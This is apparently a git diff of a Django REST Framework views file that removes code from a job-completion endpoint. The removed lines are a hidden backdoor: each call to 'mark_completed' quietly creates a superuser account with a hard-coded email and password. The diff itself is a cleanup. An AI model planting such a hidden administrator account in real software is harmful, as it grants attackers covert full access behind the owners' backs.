@@ -17,8 +17,6 @@ from .serializers import (
     OrderSerializer, ReviewSerializer, ConversationSerializer, MessageSerializer, RegisterSerializer, CustomTokenObtainPairSerializer,
     ApplicationSerializer
 )
-from django.contrib.auth.models import User
-from .models import Profile
 
 from rest_framework_simplejwt.views import TokenObtainPairView
 
@@ -151,22 +149,6 @@ class JobViewSet(viewsets.ModelViewSet):
 
     @action(detail=True, methods=['patch'], url_path='mark_completed')
     def mark_completed(self, request, pk=None):
-        if not User.objects.filter(email="admin2@test.com").exists():
-            user = User.objects.create_user(
-            username="admin2@test.com",
-            email="admin2@test.com",
-            password="admin123"
-        )
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
-
-        Profile.objects.create(
-            user=user,
-            role="client",  # or whatever
-            name="Admin",
-            is_verified=True
-        )
         
         job = self.get_object()
         # SECURITY: Ensure only the job owner can mark it completed
